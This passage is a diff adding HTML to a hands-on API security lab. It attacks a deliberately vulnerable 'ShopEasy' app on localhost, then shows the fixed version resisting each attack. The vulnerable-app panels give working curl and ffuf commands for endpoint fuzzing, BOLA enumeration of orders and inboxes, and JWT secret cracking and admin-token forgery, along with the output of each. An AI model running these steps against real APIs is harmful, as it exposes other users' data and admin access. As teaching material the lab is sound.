+      <div class="tool-name">PyJWT <span class="tool-ver">pip install</span></div>
+      <div class="tool-desc">Python library for creating, signing, and verifying JSON Web Tokens. Required for the JWT crack and forgery exercise.</div>
+      <div class="tool-install">pip3 install PyJWT --break-system-packages</div>
+    </div>
+    <div class="tool-card">
+      <div class="tool-name">Docker <span class="tool-ver">required</span></div>
+      <div class="tool-desc">Runs both ShopEasy apps in isolated containers. One compose command builds and starts everything.</div>
+      <div class="tool-install">see Setup section above</div>
+    </div>
+  </div>
+
+  <h3 style="font-size:0.95rem;font-weight:600;margin-bottom:1rem">Install all at once (Kali / Ubuntu)</h3>
+  <div class="cmd">
+    <div class="cmd-bar"><span>terminal</span><button class="copy-btn" onclick="cpEl('install-all',this)">copy</button></div>
+    <div class="cmd-body" id="install-all">sudo apt update
+sudo apt install -y curl ffuf python3 python3-pip
+pip3 install PyJWT --break-system-packages
+
+# Verify everything is ready
+curl --version | head -1
+ffuf -V
+python3 -c "import jwt; print('PyJWT', jwt.__version__)"</div>
+  </div>
+
+  <div class="callout warn" style="margin-top:0.75rem">
+    <span class="callout-icon">⚠</span>
+    <span><strong>PyJWT conflict:</strong> If you see <code class="inline">AttributeError: module 'jwt' has no attribute 'decode'</code>, fix with: <code class="inline">pip3 install --upgrade --force-reinstall PyJWT --break-system-packages</code></span>
+  </div>
+</section>
+
+<hr class="div">
+
+<!-- ════════════════════════════════════════════════════
+     VULNERABLE APP LABS
+════════════════════════════════════════════════════ -->
+<section class="section" id="labs-vuln">
+  <div class="sec-label">// part one</div>
+  <div class="section-with-badge">
+    <h2 style="margin-bottom:0">Attacking the <em>vulnerable</em> app</h2>
+    <span class="port-badge vuln">localhost:5000</span>
+  </div>
+  <p class="sec-sub">All four attacks work on this version. Work through them in order — each one builds on the previous.</p>
+
+  <div class="lab-context vuln-ctx">
+    <span style="font-size:1.1rem;flex-shrink:0">🔴</span>
+    <span>All commands in this section target <strong>port 5000</strong> — the vulnerable version. Make sure it's running before you start.</span>
+  </div>
+
+  <div class="attacks-overview">
+    <div class="atk-card" onclick="openPanel('p-fuzzing')">
+      <div class="atk-icon" style="background:var(--amber-dim)">🔍</div>
+      <div class="atk-title">API Fuzzing</div>
+      <div class="atk-desc">Discover hidden endpoints the API never told you about.</div>
+      <div class="atk-owasp" style="background:var(--amber-dim);color:var(--amber);border:1px solid rgba(245,158,11,0.2)">API8 — Misconfiguration</div>
+    </div>
+    <div class="atk-card" onclick="openPanel('p-bola-orders')">
+      <div class="atk-icon" style="background:var(--red-dim)">📦</div>
+      <div class="atk-title">BOLA — Orders</div>
+      <div class="atk-desc">Access any customer's order by changing one number in the URL.</div>
+      <div class="atk-owasp" style="background:var(--red-dim);color:var(--red);border:1px solid rgba(244,63,94,0.2)">API1 — Broken Object Auth</div>
+    </div>
+    <div class="atk-card" onclick="openPanel('p-jwt')">
+      <div class="atk-icon" style="background:var(--purple-dim)">🪙</div>
+      <div class="atk-title">JWT Forgery</div>
+      <div class="atk-desc">Crack the weak secret, forge an admin token, unlock the panel.</div>
+      <div class="atk-owasp" style="background:var(--purple-dim);color:var(--purple);border:1px solid rgba(168,85,247,0.2)">API2 — Broken Auth</div>
+    </div>
+    <div class="atk-card" onclick="openPanel('p-bola-msgs')">
+      <div class="atk-icon" style="background:var(--blue-dim)">💬</div>
+      <div class="atk-title">BOLA — Messages</div>
+      <div class="atk-desc">Read the admin's private inbox by changing a query parameter.</div>
+      <div class="atk-owasp" style="background:var(--red-dim);color:var(--red);border:1px solid rgba(244,63,94,0.2)">API1 — Broken Object Auth</div>
+    </div>
+  </div>
+
+  <!-- PANEL 1 — FUZZING -->
+  <div class="lab-panel" id="p-fuzzing">
+    <button class="lab-trigger" onclick="togglePanel('p-fuzzing')">
+      <div class="lab-trigger-icon" style="background:var(--amber-dim)">🔍</div>
+      <div class="lab-trigger-info">
+        <div class="lab-trigger-title">API Fuzzing — Discover Hidden Endpoints</div>
+        <div class="lab-trigger-sub">Use ffuf + a wordlist to find endpoints the API never advertised · Tools: ffuf, curl</div>
+      </div>
+      <div class="lab-trigger-right">
+        <span class="lab-owasp" style="background:var(--amber-dim);color:var(--amber);border:1px solid rgba(245,158,11,0.2)">API8:2023</span>
+        <svg class="lab-chevron" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path d="M19 9l-7 7-7-7"/></svg>
+      </div>
+    </button>
+    <div class="lab-body">
+      <div class="lab-concept">
+        <strong style="color:var(--text)">What is fuzzing?</strong><br>
+        Developers often leave behind debug routes, admin panels, and backup endpoints they forget to remove before going live. Fuzzing automates the search — we give a tool a list of common path names and let it try each one against the API, reporting back anything that responds with a non-404 status code.
+      </div>
+
+      <div class="step">
+        <div class="step-hd"><div class="step-num" style="background:var(--amber-dim);color:var(--amber)">1</div><h3>Create the wordlist</h3></div>
+        <p>Save this as <code class="inline">~/api-wordlist.txt</code>.</p>
+        <div class="cmd">
+          <div class="cmd-bar"><span>terminal</span><button class="copy-btn" onclick="cpText(WL,this)">copy</button></div>
+          <div class="cmd-body" id="wl-body"></div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-hd"><div class="step-num" style="background:var(--amber-dim);color:var(--amber)">2</div><h3>Run the fuzzer against the vulnerable app</h3></div>
+        <div class="cmd">
+          <div class="cmd-bar"><span>terminal — port 5000</span><button class="copy-btn" onclick="cpEl('fuzz-cmd',this)">copy</button></div>
+          <div class="cmd-body" id="fuzz-cmd">ffuf -u http://localhost:5000/api/FUZZ \
+     -w ~/api-wordlist.txt \
+     -mc 200,201,301,302,403,500 \
+     -v</div>
+        </div>
+        <div class="out">
+          <div class="out-bar">output — 5 hidden endpoints discovered</div>
+          <div class="out-body"><span class="ok">[Status: 200]</span> GET http://localhost:5000/api/internal/metrics
+<span class="ok">[Status: 200]</span> GET http://localhost:5000/api/backup
+<span class="warn">[Status: 200]</span> GET http://localhost:5000/api/debug/config      <span class="warn">← leaks JWT secret</span>
+<span class="bad">[Status: 200]</span> GET http://localhost:5000/api/admin/users       <span class="bad">← no auth required</span>
+<span class="bad">[Status: 200]</span> GET http://localhost:5000/api/admin/orders      <span class="bad">← no auth required</span></div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-hd"><div class="step-num" style="background:var(--amber-dim);color:var(--amber)">3</div><h3>Investigate the hits</h3></div>
+        <div class="cmd">
+          <div class="cmd-bar"><span>terminal — leaks JWT secret + internals</span><button class="copy-btn" onclick="cpEl('fuzz-debug',this)">copy</button></div>
+          <div class="cmd-body" id="fuzz-debug">curl -s http://localhost:5000/api/debug/config | python3 -m json.tool</div>
+        </div>
+        <div class="out">
+          <div class="out-bar">response</div>
+          <div class="out-body">{  "debug": true,  "environment": "production",
+    <span class="bad">"jwt_secret": "secret123"</span>,  "database": "/tmp/shopeasy.db" }</div>
+        </div>
+        <div class="cmd">
+          <div class="cmd-bar"><span>terminal — all users + plaintext passwords, zero auth</span><button class="copy-btn" onclick="cpEl('fuzz-admin',this)">copy</button></div>
+          <div class="cmd-body" id="fuzz-admin">curl -s http://localhost:5000/api/admin/users | python3 -m json.tool</div>
+        </div>
+        <div class="out">
+          <div class="out-bar">response</div>
+          <div class="out-body">[ { "username":"alice", <span class="bad">"password":"alice123"</span> },
+  { "username":"admin", <span class="bad">"password":"adminpass"</span>, "role":"admin" } ]</div>
+        </div>
+      </div>
+
+      <div class="callout success">
+        <span class="callout-icon">✓</span>
+        <span><strong>Key insight:</strong> Fuzzing is always the first step. In under a second it found the JWT secret and all plaintext passwords — making every other attack trivial.</span>
+      </div>
+
+      <div class="chain">
+        <div class="chain-label">attack chain this unlocks</div>
+        <div class="chain-row"><span class="chain-step">ffuf</span><span class="chain-desc">→ /api/debug/config</span><span class="chain-res">jwt_secret = "secret123"</span></div>
+        <div class="chain-row"><span class="chain-step">ffuf</span><span class="chain-desc">→ /api/admin/users</span><span class="chain-res">all passwords in plaintext</span></div>
+        <div class="chain-row"><span class="chain-step">secret</span><span class="chain-desc">→ forge JWT with role=admin</span><span class="chain-res">full admin access</span></div>
+        <div class="chain-row"><span class="chain-step">passwords</span><span class="chain-desc">→ login directly as admin</span><span class="chain-res">bypasses JWT entirely</span></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PANEL 2 — BOLA ORDERS -->
+  <div class="lab-panel" id="p-bola-orders">
+    <button class="lab-trigger" onclick="togglePanel('p-bola-orders')">
+      <div class="lab-trigger-icon" style="background:var(--red-dim)">📦</div>
+      <div class="lab-trigger-info">
+        <div class="lab-trigger-title">BOLA — Access Other Users' Orders</div>
+        <div class="lab-trigger-sub">Read any customer's order by changing one number in the URL path · Tools: curl</div>
+      </div>
+      <div class="lab-trigger-right">
+        <span class="lab-owasp" style="background:var(--red-dim);color:var(--red);border:1px solid rgba(244,63,94,0.2)">API1:2023</span>
+        <svg class="lab-chevron" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path d="M19 9l-7 7-7-7"/></svg>
+      </div>
+    </button>
+    <div class="lab-body">
+      <div class="lab-concept">
+        <strong style="color:var(--text)">Authentication vs Authorization</strong><br>
+        <strong style="color:var(--text)">Authentication</strong> = "who are you?" — proving your identity with a login.<br>
+        <strong style="color:var(--text)">Authorization</strong> = "are you allowed to do this?" — checking ownership.<br><br>
+        <strong style="color:var(--text)">BOLA</strong> — #1 in the OWASP API Top 10 — means the API checks that you're logged in (✅) but never checks that the resource belongs to you (❌).
+      </div>
+
+      <div class="step">
+        <div class="step-hd"><div class="step-num" style="background:var(--red-dim);color:var(--red)">1</div><h3>Log in as Alice and save token</h3></div>
+        <div class="cmd">
+          <div class="cmd-bar"><span>terminal — port 5000</span><button class="copy-btn" onclick="cpEl('bola-login',this)">copy</button></div>
+          <div class="cmd-body" id="bola-login">TOKEN=$(curl -s -X POST http://localhost:5000/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"alice","password":"alice123"}' \
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
+echo $TOKEN</div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-hd"><div class="step-num" style="background:var(--red-dim);color:var(--red)">2</div><h3>Access Alice's own order — expected</h3></div>
+        <div class="cmd">
+          <div class="cmd-bar"><span>terminal</span><button class="copy-btn" onclick="cpEl('bola-own',this)">copy</button></div>
+          <div class="cmd-body" id="bola-own">curl -s http://localhost:5000/api/orders/1 \
+  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool</div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-hd"><div class="step-num" style="background:var(--red-dim);color:var(--red)">3</div><h3>The attack — access Bob's order</h3></div>
+        <p>Change <code class="inline">/orders/1</code> to <code class="inline">/orders/3</code>. Order #3 belongs to Bob.</p>
+        <div class="cmd">
+          <div class="cmd-bar"><span>terminal</span><button class="copy-btn" onclick="cpEl('bola-attack',this)">copy</button></div>
+          <div class="cmd-body" id="bola-attack">curl -s http://localhost:5000/api/orders/3 \
+  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool</div>
+        </div>
+        <div class="out">
+          <div class="out-bar">response — Bob's order, read by Alice</div>
+          <div class="out-body">{  "order_id": 3,  <span class="bad">"owner_username": "bob"</span>,
+   <span class="bad">"shipping_address": "88 Oak Ave, Portland"</span>,  <span class="bad">"card_last4": "5678"</span>  }</div>
+        </div>
+        <div class="callout danger">
+          <span class="callout-icon">⚠</span>
+          <span>Alice just read Bob's home address and card digits using only her own valid login token — just by changing a number in the URL.</span>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-hd"><div class="step-num" style="background:var(--red-dim);color:var(--red)">4</div><h3>Enumerate all orders</h3></div>
+        <div class="cmd">
+          <div class="cmd-bar"><span>terminal</span><button class="copy-btn" onclick="cpEl('bola-loop',this)">copy</button></div>
+          <div class="cmd-body" id="bola-loop">for i in 1 2 3 4 5; do
+  echo "===== Order $i ====="
+  curl -s http://localhost:5000/api/orders/$i \
+    -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
+  echo ""
+done</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PANEL 3 — JWT -->
+  <div class="lab-panel" id="p-jwt">
+    <button class="lab-trigger" onclick="togglePanel('p-jwt')">
+      <div class="lab-trigger-icon" style="background:var(--purple-dim)">🪙</div>
+      <div class="lab-trigger-info">
+        <div class="lab-trigger-title">JWT Attacks — Forge an Admin Token</div>
+        <div class="lab-trigger-sub">Crack the signing secret, rewrite the payload, unlock the admin panel · Tools: curl, Python, PyJWT</div>
+      </div>
+      <div class="lab-trigger-right">
+        <span class="lab-owasp" style="background:var(--purple-dim);color:var(--purple);border:1px solid rgba(168,85,247,0.2)">API2:2023</span>
+        <svg class="lab-chevron" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path d="M19 9l-7 7-7-7"/></svg>
+      </div>
+    </button>
+    <div class="lab-body">
+      <div class="lab-concept">
+        <strong style="color:var(--text)">What is a JWT?</strong><br>
+        A JSON Web Token has three Base64-encoded parts: <code class="inline">header.payload.signature</code>. The payload holds claims like your role — visible to anyone with the token. The signature prevents tampering only if the secret is strong and the server validates it properly.
+      </div>
+
+      <div class="step">
+        <div class="step-hd"><div class="step-num" style="background:var(--purple-dim);color:var(--purple)">1</div><h3>Get a token and decode it</h3></div>
+        <div class="cmd">
+          <div class="cmd-bar"><span>terminal — port 5000</span><button class="copy-btn" onclick="cpEl('jwt-login',this)">copy</button></div>
+          <div class="cmd-body" id="jwt-login">TOKEN=$(curl -s -X POST http://localhost:5000/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"alice","password":"alice123"}' \
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
+
+curl -s -X POST http://localhost:5000/api/jwt/decode \
+  -H "Content-Type: application/json" \
+  -d "{\"token\": \"$TOKEN\"}" | python3 -m json.tool</div>
+        </div>
+        <div class="out">
+          <div class="out-bar">decoded — note the role claim in the payload</div>
+          <div class="out-body">{ "payload": { "user_id":1, "username":"alice",
+    <span class="warn">"role":"user"</span>,  "exp":1720000000 } }</div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-hd"><div class="step-num" style="background:var(--purple-dim);color:var(--purple)">2</div><h3>Crack the signing secret</h3></div>
+        <div class="cmd">
+          <div class="cmd-bar"><span>terminal</span><button class="copy-btn" onclick="cpEl('jwt-save',this)">copy</button></div>
+          <div class="cmd-body" id="jwt-save">echo $TOKEN > alice.jwt</div>
+        </div>
+        <div class="cmd">
+          <div class="cmd-bar"><span>jwt_crack.py — save then run: python3 jwt_crack.py</span><button class="copy-btn" onclick="cpText(CRACK,this)">copy</button></div>
+          <div class="cmd-body" id="crack-body"></div>
+        </div>
+        <div class="out">
+          <div class="out-bar">output</div>
+          <div class="out-body">[-] Not: secret
+<span class="ok">[+] SECRET FOUND: secret123</span></div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-hd"><div class="step-num" style="background:var(--purple-dim);color:var(--purple)">3</div><h3>Forge an admin token</h3></div>
+        <div class="cmd">
+          <div class="cmd-bar"><span>terminal</span><button class="copy-btn" onclick="cpText(FORGE,this)">copy</button></div>
+          <div class="cmd-body" id="forge-body"></div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-hd"><div class="step-num" style="background:var(--purple-dim);color:var(--purple)">4</div><h3>Use the forged token</h3></div>
+        <div class="cmd">
+          <div class="cmd-bar"><span>terminal — port 5000</span><button class="copy-btn" onclick="cpEl('jwt-use',this)">copy</button></div>
+          <div class="cmd-body" id="jwt-use">curl -s http://localhost:5000/api/admin/secret \
+  -H "Authorization: Bearer $FORGED" | python3 -m json.tool</div>
+        </div>
+        <div class="out">
+          <div class="out-bar">response — admin panel unlocked</div>
+          <div class="out-body"><span class="ok">"message": "🔓 Admin panel unlocked via JWT forgery!"</span>
+<span class="bad">"flag":          "FLAG{jwt_role_escalation_success}"</span>
+<span class="bad">"stripe_secret": "sk_live_4eC39HqLyjWDarjtT1zdp7dc"</span>
+<span class="bad">"db_password":   "Sup3rS3cr3t!"</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PANEL 4 — BOLA MESSAGES -->
+  <div class="lab-panel" id="p-bola-msgs">
+    <button class="lab-trigger" onclick="togglePanel('p-bola-msgs')">
+      <div class="lab-trigger-icon" style="background:var(--blue-dim)">💬</div>
+      <div class="lab-trigger-info">
+        <div class="lab-trigger-title">BOLA — Read the Admin's Private Inbox</div>
+        <div class="lab-trigger-sub">Same vulnerability, different location — a query parameter · Tools: curl</div>
+      </div>
+      <div class="lab-trigger-right">
+        <span class="lab-owasp" style="background:var(--red-dim);color:var(--red);border:1px solid rgba(244,63,94,0.2)">API1:2023</span>
+        <svg class="lab-chevron" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path d="M19 9l-7 7-7-7"/></svg>
+      </div>
+    </button>
+    <div class="lab-body">
+      <div class="lab-concept">
+        <strong style="color:var(--text)">BOLA comes in many forms.</strong><br>
+        In the Orders attack the vulnerable ID was in the URL path (<code class="inline">/orders/3</code>). Here it's in a query parameter (<code class="inline">?user_id=4</code>). Same root cause — API accepts an object ID from the client without verifying ownership — just in a different location.
+      </div>
+
+      <div class="step">
+        <div class="step-hd"><div class="step-num" style="background:var(--blue-dim);color:var(--blue)">1</div><h3>Read Alice's own messages</h3></div>
+        <div class="cmd">
+          <div class="cmd-bar"><span>terminal — port 5000</span><button class="copy-btn" onclick="cpEl('msg-own',this)">copy</button></div>
+          <div class="cmd-body" id="msg-own">curl -s "http://localhost:5000/api/messages?user_id=1" \
+  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool</div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-hd"><div class="step-num" style="background:var(--blue-dim);color:var(--blue)">2</div><h3>The attack — change user_id to 4</h3></div>
+        <div class="cmd">
+          <div class="cmd-bar"><span>terminal</span><button class="copy-btn" onclick="cpEl('msg-attack',this)">copy</button></div>
+          <div class="cmd-body" id="msg-attack">curl -s "http://localhost:5000/api/messages?user_id=4" \
+  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool</div>
+        </div>
+        <div class="out">
+          <div class="out-bar">response — admin's private inbox read by Alice</div>
+          <div class="out-body">[ { "subject": "ADMIN: Stripe secret key",
+    <span class="bad">"body": "sk_live_4eC39HqLyjWDarjtT1zdp7dc — do not share"</span> },
+  { "subject": "ADMIN: DB backup creds",
+    <span class="bad">"body": "Host: db.internal, user: root, pass: Sup3rS3cr3t!"</span> } ]</div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-hd"><div class="step-num" style="background:var(--blue-dim);color:var(--blue)">3</div><h3>Enumerate all inboxes</h3></div>
+        <div class="cmd">
+          <div class="cmd-bar"><span>terminal</span><button class="copy-btn" onclick="cpEl('msg-loop',this)">copy</button></div>
+          <div class="cmd-body" id="msg-loop">for i in 1 2 3 4; do
+  echo "===== Inbox of user $i ====="
+  curl -s "http://localhost:5000/api/messages?user_id=$i" \
+    -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
+  echo ""
+done</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<hr class="div">
+
+<!-- ════════════════════════════════════════════════════
+     SECURE APP LABS
+════════════════════════════════════════════════════ -->
+<section class="section" id="labs-secure">
+  <div class="sec-label">// part two</div>
+  <div class="section-with-badge">
+    <h2 style="margin-bottom:0">Attacking the <em>secure</em> app</h2>
+    <span class="port-badge secure">localhost:5001</span>
+  </div>
+  <p class="sec-sub">Run every attack again — this time against the fixed version. See exactly how each fix responds.</p>
+
+  <div class="lab-context secure-ctx">
+    <span style="font-size:1.1rem;flex-shrink:0">🟢</span>
+    <span>All commands in this section target <strong>port 5001</strong> — the secure version. The same attacks, the same technique — different outcomes.</span>
+  </div>
+
+  <!-- SECURE PANEL 1 — FUZZING -->
+  <div class="lab-panel" id="s-fuzzing">
+    <button class="lab-trigger" onclick="togglePanel('s-fuzzing')">
+      <div class="lab-trigger-icon" style="background:var(--green-dim)">🔍</div>
+      <div class="lab-trigger-info">
+        <div class="lab-trigger-title">Fuzzing the Secure App</div>
+        <div class="lab-trigger-sub">Same wordlist, same tool — observe what the secure app does differently</div>
+      </div>
+      <div class="lab-trigger-right">
+        <span class="lab-owasp" style="background:var(--green-dim);color:var(--green);border:1px solid var(--green-b)">Fixed — API8</span>
+        <svg class="lab-chevron" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path d="M19 9l-7 7-7-7"/></svg>
+      </div>
+    </button>
+    <div class="lab-body">
+      <div class="step">
+        <div class="step-hd"><div class="step-num" style="background:var(--green-dim);color:var(--green)">1</div><h3>Run the exact same fuzzer command</h3></div>
+        <p>Only the port changes — everything else is identical.</p>
+        <div class="cmd">
+          <div class="cmd-bar"><span>terminal — port 5001</span><button class="copy-btn" onclick="cpEl('s-fuzz-cmd',this)">copy</button></div>
+          <div class="cmd-body" id="s-fuzz-cmd">ffuf -u http://localhost:5001/api/FUZZ \
+     -w ~/api-wordlist.txt \
+     -mc 200,201,301,302,403,500 \
+     -v</div>
+        </div>
+        <div class="out">
+          <div class="out-bar">output — complete silence</div>
+          <div class="out-body"><span style="color:var(--muted)">::: Progress: [38/38] :::</span>
+<span style="color:var(--green)">0 results — no endpoints found</span></div>
+        </div>
+        <div class="secure-result">
+          <div class="secure-result-title">🔒 Why this works</div>
+          <p>The debug, backup, and internal metrics endpoints are simply not registered in the secure app. They return 404 — indistinguishable from any other non-existent path. The unauthenticated <code>/api/admin/users</code> route now requires a valid token with an admin role verified from the database. An attacker gets no foothold.</p>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-hd"><div class="step-num" style="background:var(--green-dim);color:var(--green)">2</div><h3>Try to access the debug endpoint directly</h3></div>
+        <div class="cmd">
+          <div class="cmd-bar"><span>terminal</span><button class="copy-btn" onclick="cpEl('s-debug',this)">copy</button></div>
+          <div class="cmd-body" id="s-debug">curl -s http://localhost:5001/api/debug/config | python3 -m json.tool</div>
+        </div>
+        <div class="out">
+          <div class="out-bar">response</div>
+          <div class="out-body"><span class="ok">404 Not Found — this endpoint does not exist</span></div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-hd"><div class="step-num" style="background:var(--green-dim);color:var(--green)">3</div><h3>Try to access admin users without a token</h3></div>
+        <div class="cmd">
+          <div class="cmd-bar"><span>terminal</span><button class="copy-btn" onclick="cpEl('s-admin',this)">copy</button></div>
+          <div class="cmd-body" id="s-admin">curl -s http://localhost:5001/api/admin/users | python3 -m json.tool</div>
+        </div>
+        <div class="out">
+          <div class="out-bar">response</div>
+          <div class="out-body"><span class="ok">{ "error": "Authentication required" }  401</span></div>
+        </div>
+      </div>
+
+      <div class="compare">
+        <div class="cmp-box vuln"><div class="cmp-hd">❌ Vulnerable :5000</div><div class="cmp-body">GET /api/debug/config   → 200 jwt_secret exposed
+GET /api/admin/users   → 200 all passwords returned
+GET /api/backup        → 200 backup creds exposed</div></div>
+        <div class="cmp-box fix"><div class="cmp-hd">✅ Secure :5001</div><div class="cmp-body">GET /api/debug/config   → 404 doesn't exist
+GET /api/admin/users   → 401 auth required
+GET /api/backup        → 404 doesn't exist</div></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- SECURE PANEL 2 — BOLA ORDERS -->
+  <div class="lab-panel" id="s-bola-orders">
+    <button class="lab-trigger" onclick="togglePanel('s-bola-orders')">
+      <div class="lab-trigger-icon" style="background:var(--green-dim)">📦</div>
+      <div class="lab-trigger-info">
+        <div class="lab-trigger-title">BOLA Orders — Against the Secure App</div>
+        <div class="lab-trigger-sub">Try to access Bob's order using Alice's token on port 5001</div>
+      </div>
+      <div class="lab-trigger-right">
+        <span class="lab-owasp" style="background:var(--green-dim);color:var(--green);border:1px solid var(--green-b)">Fixed — API1</span>
+        <svg class="lab-chevron" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path d="M19 9l-7 7-7-7"/></svg>
+      </div>
+    </button>
+    <div class="lab-body">
+      <div class="step">
+        <div class="step-hd"><div class="step-num" style="background:var(--green-dim);color:var(--green)">1</div><h3>Get Alice's token from the secure app</h3></div>
+        <div class="cmd">
+          <div class="cmd-bar"><span>terminal — port 5001</span><button class="copy-btn" onclick="cpEl('s-bola-login',this)">copy</button></div>
+          <div class="cmd-body" id="s-bola-login">TS=$(curl -s -X POST http://localhost:5001/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"alice","password":"alice123"}' \
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
+echo $TS</div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-hd"><div class="step-num" style="background:var(--green-dim);color:var(--green)">2</div><h3>Try to access Bob's order</h3></div>
+        <div class="cmd">
+          <div class="cmd-bar"><span>terminal</span><button class="copy-btn" onclick="cpEl('s-bola-attack',this)">copy</button></div>
+          <div class="cmd-body" id="s-bola-attack">curl -s http://localhost:5001/api/orders/3 \
+  -H "Authorization: Bearer $TS" | python3 -m json.tool</div>
+        </div>
+        <div class="out">
+          <div class="out-bar">response</div>
+          <div class="out-body"><span class="ok">{ "error": "You are not authorised to view this order" }  403</span></div>
+        </div>
+        <div class="secure-result">
+          <div class="secure-result-title">🔒 Why this works</div>
+          <p>The secure endpoint checks <code>order.user_id == request.user.id</code> before returning anything. Alice's user ID is 1, Bob's order belongs to user ID 2 — the check fails and a 403 is returned. Bob's address and card digits are never sent over the wire.</p>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-hd"><div class="step-num" style="background:var(--green-dim);color:var(--green)">3</div><h3>Alice's own order still works</h3></div>
+        <div class="cmd">
+          <div class="cmd-bar"><span>terminal</span><button class="copy-btn" onclick="cpEl('s-bola-own',this)">copy</button></div>
+          <div class="cmd-body" id="s-bola-own">curl -s http://localhost:5001/api/orders/1 \
+  -H "Authorization: Bearer $TS" | python3 -m json.tool</div>
+        </div>
+        <p style="font-size:0.82rem;color:var(--muted)">Returns Alice's order normally — the fix only blocks access to other users' orders, not your own.</p>
+      </div>
+
+      <div class="compare">
+        <div class="cmp-box vuln"><div class="cmp-hd">❌ Vulnerable :5000</div><div class="cmp-body">GET /api/orders/3  →  200
+Returns Bob's address + card digits
+No ownership check exists</div></div>
+        <div class="cmp-box fix"><div class="cmp-hd">✅ Secure :5001</div><div class="cmp-body">GET /api/orders/3  →  403
+"You are not authorised to view this order"
+One ownership check added</div></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- SECURE PANEL 3 — JWT -->
+  <div class="lab-panel" id="s-jwt">
+    <button class="lab-trigger" onclick="togglePanel('s-jwt')">
+      <div class="lab-trigger-icon" style="background:var(--green-dim)">🪙</div>
+      <div class="lab-trigger-info">
+        <div class="lab-trigger-title">JWT Forgery — Against the Secure App</div>
+        <div class="lab-trigger-sub">Try to crack the secret and forge a token on port 5001</div>
+      </div>
+      <div class="lab-trigger-right">
+        <span class="lab-owasp" style="background:var(--green-dim);color:var(--green);border:1px solid var(--green-b)">Fixed — API2</span>
+        <svg class="lab-chevron" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path d="M19 9l-7 7-7-7"/></svg>
+      </div>
+    </button>
+    <div class="lab-body">
+      <div class="step">
+        <div class="step-hd"><div class="step-num" style="background:var(--green-dim);color:var(--green)">1</div><h3>Get a token and inspect the payload</h3></div>
+        <div class="cmd">
+          <div class="cmd-bar"><span>terminal — port 5001</span><button class="copy-btn" onclick="cpEl('s-jwt-login',this)">copy</button></div>
+          <div class="cmd-body" id="s-jwt-login">TS=$(curl -s -X POST http://localhost:5001/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"alice","password":"alice123"}' \
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
+
+curl -s -X POST http://localhost:5001/api/jwt/decode \
+  -H "Content-Type: application/json" \
+  -d "{\"token\": \"$TS\"}" | python3 -m json.tool</div>
+        </div>
+        <div class="out">
+          <div class="out-bar">decoded payload — notice what's missing</div>
+          <div class="out-body">{
+  "payload": {
+    <span class="ok">"user_id": 1</span>,
+    <span class="ok">"exp": 1720000000</span>
+  },
+  <span class="ok">"note": "Signature verified ✓"</span>
+}
+<span style="color:var(--green)">← No "role" claim. No "username". Nothing to forge.</span></div>
+        </div>
+        <div class="secure-result">
+          <div class="secure-result-title">🔒 First layer of defence</div>
+          <p>The secure app's token contains only <code>user_id</code> and <code>exp</code>. There is no <code>role</code> claim — so adding <code>role: admin</code> to a forged token is pointless because the server never reads it. The role is always fetched fresh from the database using the <code>user_id</code>.</p>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-hd"><div class="step-num" style="background:var(--green-dim);color:var(--green)">2</div><h3>Try to crack the secret</h3></div>
+        <div class="cmd">
+          <div class="cmd-bar"><span>terminal</span><button class="copy-btn" onclick="cpEl('s-crack',this)">copy</button></div>
+          <div class="cmd-body" id="s-crack">echo $TS > secure.jwt
+python3 jwt_crack.py  # point it at secure.jwt</div>
+        </div>
+        <div class="out">
+          <div class="out-bar">output</div>
+          <div class="out-body">[-] Not: secret
+[-] Not: secret123
+[-] Not: password
+... (all 12 words tried)
+<span class="ok">[!] Secret not in wordlist — too strong to crack</span></div>
+        </div>
+        <div class="secure-result">
+          <div class="secure-result-title">🔒 Second layer of defence</div>
+          <p>The secure app generates a random 256-bit secret at startup using <code>secrets.token_hex(32)</code>. There are 2²⁵⁶ possible values — a wordlist attack is computationally impossible. Even with a GPU cluster running for years, the secret cannot be found by brute force.</p>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-hd"><div class="step-num" style="background:var(--green-dim);color:var(--green)">3</div><h3>Try using the forged token from before</h3></div>
